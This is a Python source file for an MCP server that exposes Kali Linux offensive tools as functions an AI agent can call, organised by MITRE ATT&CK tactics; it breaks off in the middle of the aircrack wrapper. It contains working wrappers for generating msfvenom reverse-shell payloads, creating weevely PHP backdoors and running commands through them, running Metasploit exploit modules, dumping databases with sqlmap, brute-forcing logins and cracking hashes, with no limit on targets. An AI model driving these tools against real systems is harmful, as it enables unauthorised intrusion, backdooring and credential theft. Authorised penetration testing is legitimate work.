"""
Kali Linux MCP Server
Organized by MITRE ATT&CK Framework Tactics.
Transport: streamable-http  →  http://127.0.0.1:5000/mcp

Tactics covered:
  TA0043  Reconnaissance
  TA0042  Resource Development
  TA0001  Initial Access
  TA0002  Execution
  TA0003  Persistence
  TA0004  Privilege Escalation
  TA0006  Credential Access
  TA0007  Discovery
  TA0009  Collection / Vuln Scanning
  TA0011  Wireless / C2
  ------  Utility / Health
"""

import subprocess
import shlex
import os
import tempfile
from mcp.server.fastmcp import FastMCP

mcp = FastMCP(
    "kali-mcp",
    host="127.0.0.1",
    port=5000,
)

# ===========================================================================
# Internal helpers  (not exposed as MCP tools)
# ===========================================================================

def _run(cmd: list[str], timeout: int = 120) -> dict:
    """Execute a subprocess safely (no shell=True). Returns stdout/stderr/returncode."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": f"Command timed out after {timeout}s", "returncode": -1}
    except FileNotFoundError:
        return {"stdout": "", "stderr": f"Tool not found: {cmd[0]}", "returncode": 127}


def _format(result: dict) -> str:
    parts = []
    if result["stdout"].strip():
        parts.append(result["stdout"].strip())
    if result["stderr"].strip():
        parts.append(f"[stderr]\n{result['stderr'].strip()}")
    if not parts:
        parts.append(f"(no output, exit code {result['returncode']})")
    return "\n".join(parts)


def _require_file(path: str, label: str = "file") -> str | None:
    """Return an error string if path is not an accessible absolute path, else None."""
    if not os.path.isabs(path):
        return f"Error: {label} must be an absolute path (got: {path})"
    if not os.path.exists(path):
        return f"Error: {label} not found at: {path}"
    return None


# ===========================================================================
# TA0043 – RECONNAISSANCE
# ===========================================================================

@mcp.tool()
def nmap_scan(target: str, flags: str = "-sV -T4") -> str:
    """[TA0043 Recon] Full nmap service/version scan.

    Args:
        target: IP, hostname, or CIDR (e.g. 192.168.1.0/24)
        flags: nmap flags (default: -sV -T4)
    """
    cmd = ["nmap"] + shlex.split(flags) + [target]
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def nmap_port_scan(target: str, ports: str = "1-1000", scan_type: str = "-sS") -> str:
    """[TA0043 Recon] nmap targeted port scan.

    Args:
        target: IP or hostname
        ports: Port range or list, e.g. "22,80,443" or "1-65535"
        scan_type: -sS (SYN), -sT (TCP connect), -sU (UDP)
    """
    cmd = ["nmap"] + shlex.split(scan_type) + ["-p", ports, target]
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def nmap_script_scan(target: str, scripts: str = "default", ports: str = "") -> str:
    """[TA0043 Recon] nmap NSE script scan.

    Args:
        target: IP or hostname
        scripts: NSE scripts/categories (e.g. "vuln", "smb-enum-users", "http-title")
        ports: Optional port restriction (e.g. "80,443")
    """
    cmd = ["nmap", f"--script={scripts}", target]
    if ports.strip():
        cmd += ["-p", ports.strip()]
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def masscan_scan(target: str, ports: str = "0-65535", rate: int = 1000,
                 extra_flags: str = "") -> str:
    """[TA0043 Recon] Ultra-fast TCP port scan with masscan.

    Note: requires root/sudo on most systems.

    Args:
        target: IP, hostname, or CIDR (e.g. 10.10.10.0/24)
        ports: Port range or list (e.g. "80,443" or "1-1000")
        rate: Packets per second — max 100 000
        extra_flags: Additional masscan flags
    """
    rate = min(rate, 100_000)
    cmd = ["masscan", target, "-p", ports, "--rate", str(rate)] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def gobuster_dir(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                 extensions: str = "php,html,txt", threads: int = 20) -> str:
    """[TA0043 Recon] gobuster directory/file brute-force.

    Args:
        url: Target URL (e.g. http://10.10.10.1)
        wordlist: Wordlist path
        extensions: Comma-separated extensions to probe
        threads: Concurrent threads (max 50)
    """
    cmd = [
        "gobuster", "dir",
        "-u", url, "-w", wordlist,
        "-x", extensions,
        "-t", str(min(threads, 50)),
        "--no-progress",
    ]
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def gobuster_dns(domain: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                 threads: int = 20) -> str:
    """[TA0043 Recon] gobuster DNS subdomain enumeration.

    Args:
        domain: Target domain (e.g. example.com)
        wordlist: Wordlist path
        threads: Concurrent threads (max 50)
    """
    cmd = [
        "gobuster", "dns",
        "-d", domain, "-w", wordlist,
        "-t", str(min(threads, 50)),
    ]
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def dirb_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
              extra_flags: str = "") -> str:
    """[TA0043 Recon] dirb web content scanner.

    Args:
        url: Target URL (e.g. http://10.10.10.1/)
        wordlist: Wordlist path
        extra_flags: Extra dirb flags
    """
    cmd = ["dirb", url, wordlist] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def ffuf_fuzz(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
              keyword: str = "FUZZ", extensions: str = "",
              threads: int = 40, extra_flags: str = "") -> str:
    """[TA0043 Recon] ffuf web fuzzer — replace FUZZ in URL with wordlist entries.

    Examples:
        url = "http://10.10.10.1/FUZZ"
        url = "http://10.10.10.1/?id=FUZZ"

    Args:
        url: URL containing the FUZZ keyword
        wordlist: Wordlist path
        keyword: Fuzzing keyword (default: FUZZ)
        extensions: Comma-separated extensions to append (e.g. php,html)
        threads: Concurrent threads (max 100)
        extra_flags: Additional flags (e.g. "-mc 200,301")
    """
    cmd = ["ffuf", "-u", url, "-w", f"{wordlist}:{keyword}", "-t", str(min(threads, 100))]
    if extensions.strip():
        cmd += ["-e", extensions.strip()]
    cmd += shlex.split(extra_flags)
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def wfuzz_fuzz(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
               hide_code: str = "404", threads: int = 20, extra_flags: str = "") -> str:
    """[TA0043 Recon] wfuzz web application fuzzer — use FUZZ as placeholder.

    Args:
        url: URL with FUZZ placeholder (e.g. http://10.10.10.1/FUZZ)
        wordlist: Wordlist path
        hide_code: Hide responses with this HTTP status (default: 404)
        threads: Concurrent threads (max 50)
        extra_flags: Additional wfuzz flags
    """
    cmd = [
        "wfuzz", "-c", f"--hc={hide_code}",
        "-t", str(min(threads, 50)),
        "-w", wordlist, url,
    ] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def feroxbuster_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                     extensions: str = "php,html,txt", threads: int = 50,
                     depth: int = 2, extra_flags: str = "") -> str:
    """[TA0043 Recon] feroxbuster recursive directory brute-force.

    Args:
        url: Target URL (e.g. http://10.10.10.1)
        wordlist: Wordlist path
        extensions: Comma-separated extensions
        threads: Concurrent threads (max 100)
        depth: Recursion depth (default: 2)
        extra_flags: Additional flags
    """
    cmd = [
        "feroxbuster", "--url", url, "--wordlist", wordlist,
        "--threads", str(min(threads, 100)),
        "--depth", str(depth),
        "--no-state", "--quiet",
    ]
    for ext in extensions.split(","):
        if ext.strip():
            cmd += ["--extensions", ext.strip()]
    cmd += shlex.split(extra_flags)
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def nikto_scan(target: str, extra_flags: str = "") -> str:
    """[TA0043 Recon] nikto web vulnerability scanner.

    Args:
        target: Target URL or IP (e.g. http://10.10.10.1 or 10.10.10.1)
        extra_flags: Additional flags (e.g. "-port 8080 -Tuning 1")
    """
    cmd = ["nikto", "-h", target] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def whatweb_scan(target: str, aggression: int = 1) -> str:
    """[TA0043 Recon] WhatWeb — identify web technologies and frameworks.

    Args:
        target: Target URL or hostname
        aggression: 1 (passive) to 4 (aggressive)
    """
    cmd = ["whatweb", f"-a{max(1, min(aggression, 4))}", target]
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def wapiti_scan(url: str, extra_flags: str = "--scope folder -f txt") -> str:
    """[TA0043 Recon] wapiti web application vulnerability scanner.

    Args:
        url: Target URL
        extra_flags: Additional wapiti flags
    """
    cmd = ["wapiti", "-u", url] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=600))


@mcp.tool()
def dnsenum_scan(domain: str, extra_flags: str = "--noreverse") -> str:
    """[TA0043 Recon] dnsenum — DNS enumeration (subdomains, zone transfers, brute-force).

    Args:
        domain: Target domain (e.g. example.com)
        extra_flags: Additional dnsenum flags
    """
    cmd = ["dnsenum", "--nocolor"] + shlex.split(extra_flags) + [domain]
    return _format(_run(cmd, timeout=120))


@mcp.tool()
def dnsrecon_scan(domain: str, scan_type: str = "std", extra_flags: str = "") -> str:
    """[TA0043 Recon] dnsrecon DNS reconnaissance.

    Args:
        domain: Target domain
        scan_type: std, rvl, brt, axfr, goo, snoop, tld, zonewalk
        extra_flags: Additional flags
    """
    cmd = ["dnsrecon", "-d", domain, "-t", scan_type] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=120))


@mcp.tool()
def theharvester_scan(domain: str,
                      sources: str = "bing,certspotter,crtsh,hackertarget",
                      limit: int = 200) -> str:
    """[TA0043 Recon] theHarvester — gather emails, subdomains, hosts, IPs (OSINT).

    Args:
        domain: Target domain
        sources: Comma-separated sources: bing, certspotter, crtsh, hackertarget,
                 dnsdumpster, urlscan, virustotal, etc.
        limit: Max results per source
    """
    cmd = ["theHarvester", "-d", domain, "-b", sources, "-l", str(limit)]
    return _format(_run(cmd, timeout=120))


@mcp.tool()
def amass_enum(domain: str, passive: bool = True, extra_flags: str = "") -> str:
    """[TA0043 Recon] Amass subdomain enumeration.

    Args:
        domain: Target domain (e.g. example.com)
        passive: True = passive only (no active probing)
        extra_flags: Additional amass flags
    """
    cmd = ["amass", "enum", "-d", domain]
    if passive:
        cmd.append("-passive")
    cmd += shlex.split(extra_flags)
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def recon_ng_modules(query: str = "") -> str:
    """[TA0043 Recon] List recon-ng marketplace modules.

    Args:
        query: Optional filter string to search module names
    """
    script = f"marketplace search {query}\nexit\n" if query.strip() else "marketplace search\nexit\n"
    result = subprocess.run(
        ["recon-ng"], input=script,
        capture_output=True, text=True, timeout=30,
    )
    return _format({"stdout": result.stdout, "stderr": result.stderr,
                    "returncode": result.returncode})


@mcp.tool()
def dig_lookup(domain: str, record_type: str = "A", nameserver: str = "") -> str:
    """[TA0043 Recon] DNS record lookup with dig.

    Args:
        domain: Domain to query
        record_type: DNS record type: A, AAAA, MX, TXT, NS, CNAME, SOA, ANY, PTR, SRV
        nameserver: Optional nameserver to use (e.g. 8.8.8.8)
    """
    allowed = {"A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA", "ANY", "PTR", "SRV"}
    if record_type.upper() not in allowed:
        return f"Error: record_type must be one of {sorted(allowed)}"
    cmd = (["dig", f"@{nameserver.strip()}", domain, record_type.upper()]
           if nameserver.strip() else ["dig", domain, record_type.upper()])
    return _format(_run(cmd, timeout=15))


@mcp.tool()
def whois_lookup(target: str) -> str:
    """[TA0043 Recon] whois query on domain or IP.

    Args:
        target: Domain name or IP address
    """
    return _format(_run(["whois", target], timeout=30))


@mcp.tool()
def shodan_query(query: str, api_key: str = "") -> str:
    """[TA0043 Recon] Search Shodan for internet-connected devices/services.

    Requires SHODAN_API_KEY env variable or api_key argument.

    Args:
        query: Shodan query (e.g. "apache country:ID port:8080")
        api_key: Shodan API key (falls back to SHODAN_API_KEY env var)
    """
    key = api_key.strip() or os.environ.get("SHODAN_API_KEY", "")
    if not key:
        return "Error: provide api_key or set SHODAN_API_KEY environment variable."
    cmd = ["shodan", "--api-key", key, "search", "--fields",
           "ip_str,port,org,hostnames", query]
    return _format(_run(cmd, timeout=30))


# ===========================================================================
# TA0042 – RESOURCE DEVELOPMENT
# ===========================================================================

@mcp.tool()
def searchsploit(query: str, extra_flags: str = "") -> str:
    """[TA0042 Resource Dev] Search Exploit-DB for public exploits.

    Args:
        query: Search terms (e.g. "apache 2.4", "vsftpd 2.3.4", "windows smb")
        extra_flags: Extra flags (e.g. "-t" title-only, "--cve CVE-2021-44228", "-j" for JSON)
    """
    cmd = ["searchsploit", "--colour"] + shlex.split(extra_flags) + shlex.split(query)
    return _format(_run(cmd, timeout=30))


@mcp.tool()
def searchsploit_show(exploit_id: str) -> str:
    """[TA0042 Resource Dev] Show full path + copy an exploit by its EDB-ID.

    Args:
        exploit_id: Exploit-DB ID number (e.g. "39446")
    """
    cmd = ["searchsploit", "-p", exploit_id]
    return _format(_run(cmd, timeout=15))


@mcp.tool()
def msfvenom_generate(payload: str, lhost: str, lport: int,
                      output_format: str = "elf", output_file: str = "",
                      encoder: str = "", extra_flags: str = "") -> str:
    """[TA0042 Resource Dev] Generate a payload with msfvenom.

    Common payloads:
        linux/x64/meterpreter/reverse_tcp
        windows/x64/meterpreter/reverse_tcp
        php/meterpreter_reverse_tcp
        python/meterpreter/reverse_tcp

    Args:
        payload: Metasploit payload path
        lhost: Attacker IP (LHOST)
        lport: Listener port (LPORT)
        output_format: Output format: elf, exe, raw, py, rb, ps1, asp, war, jar, etc.
        output_file: Absolute output path (empty = print to stdout)
        encoder: Optional encoder (e.g. "x86/shikata_ga_nai")
        extra_flags: Additional msfvenom flags (e.g. "-i 5" for 5 iterations)
    """
    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", output_format,
    ]
    if encoder.strip():
        cmd += ["-e", encoder.strip()]
    if output_file.strip():
        cmd += ["-o", output_file.strip()]
    cmd += shlex.split(extra_flags)
    return _format(_run(cmd, timeout=120))


@mcp.tool()
def msfvenom_list(list_type: str = "payloads") -> str:
    """[TA0042 Resource Dev] List msfvenom modules.

    Args:
        list_type: payloads | encoders | nops | platforms | archs | formats | encrypt
    """
    allowed = {"payloads", "encoders", "nops", "platforms", "archs", "formats", "encrypt"}
    if list_type not in allowed:
        return f"Error: list_type must be one of {sorted(allowed)}"
    return _format(_run(["msfvenom", "-l", list_type], timeout=60))


@mcp.tool()
def radare2_analyze(binary_path: str, commands: str = "aaa;afl") -> str:
    """[TA0042 Resource Dev] Analyze a binary non-interactively with radare2 (r2).

    Args:
        binary_path: Absolute path to binary to analyze
        commands: Semicolon-separated r2 commands.
                  Common: aaa=analyze all, afl=list functions, pdf=disasm func,
                  iz=strings, ii=imports, iS=sections, is=symbols
    """
    err = _require_file(binary_path, "binary")
    if err:
        return err
    cmd = ["radare2", "-A", "-q", "-c", commands, binary_path]
    return _format(_run(cmd, timeout=120))


@mcp.tool()
def msf_nasm_shell(asm_instruction: str) -> str:
    """[TA0042 Resource Dev] Convert x86/x64 asm to shellcode hex via msf-nasm_shell.

    Args:
        asm_instruction: Single assembly instruction (e.g. "xor eax,eax" or "jmp esp")
    """
    result = subprocess.run(
        ["msf-nasm_shell"],
        input=asm_instruction + "\nexit\n",
        capture_output=True, text=True, timeout=10,
    )
    return _format({"stdout": result.stdout, "stderr": result.stderr,
                    "returncode": result.returncode})


@mcp.tool()
def weevely_generate(password: str, output_path: str) -> str:
    """[TA0042 Resource Dev] Generate a weevely PHP backdoor agent.

    Args:
        password: Password to authenticate with the agent
        output_path: Absolute path to save the PHP agent (e.g. /tmp/shell.php)
    """
    if not os.path.isabs(output_path):
        return "Error: output_path must be an absolute path."
    cmd = ["weevely", "generate", password, output_path]
    return _format(_run(cmd, timeout=15))


@mcp.tool()
def pyinstaller_build(script_path: str, onefile: bool = True, output_dir: str = "/tmp") -> str:
    """[TA0042 Resource Dev] Bundle a Python script into a standalone executable.

    Args:
        script_path: Absolute path to target .py script
        onefile: True = --onefile (single binary), False = --onedir
        output_dir: Directory for dist/ output
    """
    err = _require_file(script_path, "script")
    if err:
        return err
    cmd = ["pyinstaller", "--distpath", output_dir, "--workpath", "/tmp/pyinst_work"]
    if onefile:
        cmd.append("--onefile")
    cmd.append(script_path)
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def clang_compile(source_path: str, output_path: str,
                  flags: str = "-O2", language: str = "c") -> str:
    """[TA0042 Resource Dev] Compile C/C++ source with clang/clang++.

    Args:
        source_path: Absolute path to source file
        output_path: Absolute path for compiled binary output
        flags: Compiler flags (e.g. "-O2 -static -m32")
        language: "c" = clang, "cpp" = clang++
    """
    err = _require_file(source_path, "source")
    if err:
        return err
    compiler = "clang++" if language.lower() in ("cpp", "c++") else "clang"
    cmd = [compiler] + shlex.split(flags) + [source_path, "-o", output_path]
    return _format(_run(cmd, timeout=120))


# ===========================================================================
# TA0001 – INITIAL ACCESS
# ===========================================================================

@mcp.tool()
def sqlmap_scan(url: str, data: str = "",
                extra_flags: str = "--batch --level=1 --risk=1") -> str:
    """[TA0001 Initial Access] sqlmap — detect SQL injection vulnerabilities.

    Args:
        url: Target URL (e.g. http://10.10.10.1/login.php?id=1)
        data: POST data (empty = GET)
        extra_flags: Additional sqlmap flags
    """
    cmd = ["sqlmap", "-u", url] + shlex.split(extra_flags)
    if data.strip():
        cmd += ["--data", data.strip()]
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def sqlmap_dump(url: str, database: str = "", table: str = "",
                data: str = "", extra_flags: str = "--batch") -> str:
    """[TA0001 Initial Access] sqlmap — dump database contents.

    Args:
        url: Target URL with injection point
        database: Database name (empty = enumerate all)
        table: Table name (empty = enumerate tables)
        data: POST data (empty = GET)
        extra_flags: Additional sqlmap flags
    """
    cmd = ["sqlmap", "-u", url] + shlex.split(extra_flags)
    if database.strip():
        cmd += ["-D", database.strip()]
    if table.strip():
        cmd += ["-T", table.strip(), "--dump"]
    else:
        cmd += ["--dbs"] if not database.strip() else ["--tables"]
    if data.strip():
        cmd += ["--data", data.strip()]
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def commix_scan(url: str, data: str = "", technique: str = "",
                extra_flags: str = "--batch") -> str:
    """[TA0001 Initial Access] commix — automated command injection detection & exploitation.

    Args:
        url: Target URL (e.g. http://10.10.10.1/cmd.php?cmd=id)
        data: POST data (empty = GET)
        technique: classic | eval-based | time-based | file-based (empty = all)
        extra_flags: Additional commix flags
    """
    cmd = ["commix", "--url", url] + shlex.split(extra_flags)
    if data.strip():
        cmd += ["--data", data.strip()]
    if technique.strip():
        cmd += ["--technique", technique.strip()]
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def hydra_bruteforce(target: str, service: str, username: str = "",
                     userlist: str = "",
                     passlist: str = "/usr/share/wordlists/rockyou.txt",
                     port: int = 0, extra_flags: str = "-t 16") -> str:
    """[TA0001 Initial Access] Hydra credential brute-force.

    Args:
        target: IP or hostname
        service: ssh, ftp, http-post-form, smb, rdp, telnet, pop3, smtp, etc.
        username: Single username (empty = use userlist)
        userlist: Path to username list
        passlist: Path to password list
        port: Service port (0 = default)
        extra_flags: Additional hydra flags
    """
    cmd = ["hydra"]
    if username.strip():
        cmd += ["-l", username.strip()]
    elif userlist.strip():
        cmd += ["-L", userlist.strip()]
    cmd += ["-P", passlist]
    if port:
        cmd += ["-s", str(port)]
    cmd += shlex.split(extra_flags) + [target, service]
    return _format(_run(cmd, timeout=600))


@mcp.tool()
def medusa_bruteforce(target: str, service: str, username: str = "",
                      userlist: str = "",
                      passlist: str = "/usr/share/wordlists/rockyou.txt",
                      port: int = 0, threads: int = 16) -> str:
    """[TA0001 Initial Access] Medusa parallel password brute-force.

    Args:
        target: IP or hostname
        service: ssh, ftp, smb, http, telnet, rdp, pop3, smtp, etc.
        username: Single username (empty = use userlist)
        userlist: Path to username list
        passlist: Path to password list
        port: Service port (0 = default)
        threads: Concurrent threads (max 64)
    """
    cmd = ["medusa", "-h", target, "-M", service, "-P", passlist,
           "-t", str(min(threads, 64))]
    if username.strip():
        cmd += ["-u", username.strip()]
    elif userlist.strip():
        cmd += ["-U", userlist.strip()]
    if port:
        cmd += ["-n", str(port)]
    return _format(_run(cmd, timeout=600))


# ===========================================================================
# TA0002 – EXECUTION
# ===========================================================================

@mcp.tool()
def metasploit_run_module(module: str, options: dict | None = None) -> str:
    """[TA0002 Execution] Run a Metasploit auxiliary/exploit module non-interactively.

    Args:
        module: Full module path (e.g. "auxiliary/scanner/smb/smb_version",
                "exploit/multi/handler", "auxiliary/scanner/http/http_version")
        options: Dict of module options: {"RHOSTS": "10.10.10.1", "RPORT": "445"}
    """
    if options is None:
        options = {}
    lines = [f"use {module}"]
    for k, v in options.items():
        lines.append(f"set {k} {v}")
    lines += ["run", "exit"]
    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
        f.write("\n".join(lines) + "\n")
        rc_path = f.name
    try:
        result = _run(["msfconsole", "-q", "-r", rc_path], timeout=120)
    finally:
        os.unlink(rc_path)
    return _format(result)


@mcp.tool()
def weevely_cmd(url: str, password: str, command: str) -> str:
    """[TA0002 Execution] Run a command on a weevely-backdoored target.

    Args:
        url: URL where the weevely PHP agent is hosted (e.g. http://10.10.10.1/shell.php)
        password: Agent password
        command: Shell command to execute on the target
    """
    cmd = ["weevely", url, password, command]
    return _format(_run(cmd, timeout=60))


# ===========================================================================
# TA0003 – PERSISTENCE
# ===========================================================================

@mcp.tool()
def webshells_list(language: str = "") -> str:
    """[TA0003 Persistence] List available web shells from /usr/share/webshells.

    Args:
        language: Filter: php, asp, aspx, jsp, cfm, perl (empty = all)
    """
    base = "/usr/share/webshells"
    search_dir = os.path.join(base, language.strip().lower()) if language.strip() else base
    if language.strip() and not os.path.isdir(search_dir):
        return f"Error: no webshells for '{language}'. Available: php, asp, aspx, jsp, cfm, perl"
    result = subprocess.run(["find", search_dir, "-type", "f"],
                            capture_output=True, text=True)
    return result.stdout.strip() or "No shells found."


@mcp.tool()
def laudanum_list(language: str = "") -> str:
    """[TA0003 Persistence] List Laudanum injected shells from /usr/share/laudanum.

    Args:
        language: Filter: php, asp, aspx, jsp, cfm, helpers, wordpress (empty = all)
    """
    base = "/usr/share/laudanum"
    search_dir = os.path.join(base, language.strip().lower()) if language.strip() else base
    if language.strip() and not os.path.isdir(search_dir):
        available = ", ".join(os.listdir(base)) if os.path.isdir(base) else "N/A"
        return f"Error: directory not found. Available: {available}"
    result = subprocess.run(["find", search_dir, "-type", "f"],
                            capture_output=True, text=True)
    return result.stdout.strip() or "No files found."


@mcp.tool()
def webshell_read(shell_path: str) -> str:
    """[TA0003 Persistence] Read the content of a web shell or laudanum file.

    Args:
        shell_path: Absolute path (from webshells_list or laudanum_list output)
    """
    err = _require_file(shell_path, "shell")
    if err:
        return err
    if not shell_path.startswith(("/usr/share/webshells", "/usr/share/laudanum")):
        return "Error: only files under /usr/share/webshells or /usr/share/laudanum are allowed."
    try:
        return open(shell_path).read()
    except Exception as e:
        return f"Error reading file: {e}"


# ===========================================================================
# TA0004 – PRIVILEGE ESCALATION
# ===========================================================================

@mcp.tool()
def linpeas_run(extra_flags: str = "") -> str:
    """[TA0004 PrivEsc] Run linpeas.sh on the LOCAL system to find privilege escalation paths.

    Note: This runs on the machine hosting the MCP server.
    To run on a remote target, first upload the script via weevely/shell, then execute it there.
    linpeas.sh path: /usr/share/peass/linpeas/linpeas.sh

    Args:
        extra_flags: linpeas flags (e.g. "-a" for all checks, "-s" for stealth)
    """
    script = "/usr/share/peass/linpeas/linpeas.sh"
    err = _require_file(script, "linpeas.sh")
    if err:
        return err
    cmd = ["/bin/bash", script] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def unix_privesc_check(mode: str = "standard") -> str:
    """[TA0004 PrivEsc] Run unix-privesc-check on the LOCAL system.

    Args:
        mode: "standard" or "detailed"
    """
    if mode not in ("standard", "detailed"):
        return "Error: mode must be 'standard' or 'detailed'"
    return _format(_run(["unix-privesc-check", mode], timeout=120))


@mcp.tool()
def winpeas_info() -> str:
    """[TA0004 PrivEsc] Show available WinPEAS binaries for Windows privilege escalation.

    WinPEAS cannot run on Linux — copy the binary to a Windows target then execute it.
    Returns paths + usage guidance for all available WinPEAS variants.
    """
    base = "/usr/share/peass/winpeas"
    result = subprocess.run(["find", base, "-type", "f"], capture_output=True, text=True)
    files = result.stdout.strip()
    return (
        "WinPEAS files (copy to target Windows machine):\n\n"
        + files
        + "\n\nRecommended usage on Windows target:\n"
        + "  winPEASany.exe         — .NET version, works on any Windows\n"
        + "  winPEASx64.exe         — 64-bit native (fastest)\n"
        + "  winPEAS.ps1            — PowerShell (easiest to transfer)\n"
        + "  winPEAS.bat            — Batch (minimal, no dependencies)"
    )


@mcp.tool()
def peass_get_path(tool: str = "linpeas") -> str:
    """[TA0004 PrivEsc] Get filesystem paths for PEASS-ng scripts (for upload to targets).

    Args:
        tool: "linpeas" | "winpeas"
    """
    base_map = {
        "linpeas": "/usr/share/peass/linpeas",
        "winpeas": "/usr/share/peass/winpeas",
    }
    if tool.lower() not in base_map:
        return "Error: tool must be 'linpeas' or 'winpeas'"
    result = subprocess.run(["find", base_map[tool.lower()], "-type", "f"],
                            capture_output=True, text=True)
    return result.stdout.strip()


# ===========================================================================
# TA0006 – CREDENTIAL ACCESS
# ===========================================================================

@mcp.tool()
def hash_identify(hash_value: str) -> str:
    """[TA0006 Credential Access] Identify hash type using hashid.

    Args:
        hash_value: Hash string to identify
    """
    result = _run(["hashid", hash_value], timeout=10)
    if result["returncode"] == 0:
        return _format(result)
    return _format(_run(["hash-identifier", hash_value], timeout=10))


@mcp.tool()
def john_crack(hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
               format_hint: str = "") -> str:
    """[TA0006 Credential Access] Crack password hashes with John the Ripper.

    Args:
        hash_file: Absolute path to hash file
        wordlist: Wordlist path
        format_hint: Optional john format (e.g. "md5crypt", "sha512crypt", "ntlm")
    """
    err = _require_file(hash_file, "hash_file")
    if err:
        return err
    cmd = ["john", f"--wordlist={wordlist}", hash_file]
    if format_hint.strip():
        cmd.insert(1, f"--format={format_hint.strip()}")
    return _format(_run(cmd, timeout=300))


@mcp.tool()
def hashcat_crack(hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
                  hash_mode: int = 0, attack_mode: int = 0,
                  extra_flags: str = "") -> str:
    """[TA0006 Credential Access] Crack hashes with Hashcat (GPU/CPU).

    Common hash_mode values:
        0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 500=md5crypt,
        3200=bcrypt, 1400=SHA256, 13100=Kerberoast (TGS), 18200=AS-REP Roast

    Args:
        hash_file: Absolute path to hash file
        wordlist: Wordlist path
        hash_mode: Hashcat -m value
        attack_mode: 0=dictionary, 3=brute-force mask, 6=hybrid dict+mask
        extra_flags: Additional flags (e.g. "--rules-file /usr/share/hashcat/rules/best64.rule")
    """
    err = _require_file(hash_file, "hash_file")
    if err:
        return err
    cmd = [
        "hashcat", "-m", str(hash_mode), "-a", str(attack_mode),
        hash_file, wordlist, "--force",
    ] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=600))


# ===========================================================================
# TA0007 – DISCOVERY
# ===========================================================================

@mcp.tool()
def enum4linux_scan(target: str, flags: str = "-a") -> str:
    """[TA0007 Discovery] enum4linux — SMB/Windows enumeration.

    Args:
        target: Target IP
        flags: -a=all, -U=users, -S=shares, -G=groups, -P=password policy, -r=RID cycling
    """
    cmd = ["enum4linux"] + shlex.split(flags) + [target]
    return _format(_run(cmd, timeout=120))


@mcp.tool()
def smbclient_list(target: str, username: str = "", password: str = "") -> str:
    """[TA0007 Discovery] List SMB shares with smbclient.

    Args:
        target: Target IP or hostname
        username: SMB username (empty = anonymous)
        password: SMB password (empty = blank)
    """
    cmd = ["smbclient", "-L", f"//{target}"]
    cmd += (["-U", f"{username.strip()}%{password}"] if username.strip() else ["-N"])
    return _format(_run(cmd, timeout=30))


@mcp.tool()
def rpcclient_enum(target: str, username: str = "", password: str = "",
                   command: str = "enumdomusers") -> str:
    """[TA0007 Discovery] rpcclient RPC enumeration against Windows targets.

    Args:
        target: Target IP or hostname
        username: Username (empty = null session)
        password: Password
        command: enumdomusers | enumdomgroups | querydominfo | enumprivs |
                 enumprinters | querydispinfo | getdompwinfo | lsaenumsid
    """
    allowed_prefixes = {
        "enumdomusers", "enumdomgroups", "querydominfo", "enumprivs",
        "enumprinters", "querydispinfo", "getdompwinfo", "lsaenumsid", "enumalsgroups",
    }
    if not any(command.strip().startswith(p) for p in allowed_prefixes):
        return f"Error: command prefix must be one of {sorted(allowed_prefixes)}"
    cmd = ["rpcclient", "-c", command]
    cmd += (["-U", f"{username.strip()}%{password}"] if username.strip() else ["-U", "%"])
    cmd.append(target)
    return _format(_run(cmd, timeout=30))


# ===========================================================================
# TA0009 – COLLECTION / VULNERABILITY SCANNING
# ===========================================================================

@mcp.tool()
def nuclei_scan(target: str, templates: str = "",
                severity: str = "medium,high,critical",
                extra_flags: str = "") -> str:
    """[TA0009 Collection] nuclei — fast template-based vulnerability scanner.

    Args:
        target: Target URL or IP (e.g. http://10.10.10.1)
        templates: Comma-separated template tags or paths (empty = all installed)
        severity: info | low | medium | high | critical (comma-separated)
        extra_flags: Additional nuclei flags
    """
    cmd = ["nuclei", "-u", target, "-severity", severity, "-silent"]
    if templates.strip():
        cmd += ["-tags", templates.strip()]
    cmd += shlex.split(extra_flags)
    return _format(_run(cmd, timeout=300))


# ===========================================================================
# TA0011 – WIRELESS / COMMAND & CONTROL
# ===========================================================================

@mcp.tool()
def aircrack_crack(cap_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
                   bssid: str = "") -> str:
    """[TA0011 Wireless/C2] aircrack-ng — crack WPA/WEP keys from a .cap capture file.

    Args:
        cap_file: Absolute path to .cap file
        wordlist: Wordlist for WPA cracking
        bssid: Target BSSID (optional, auto-detects if empty)
    """
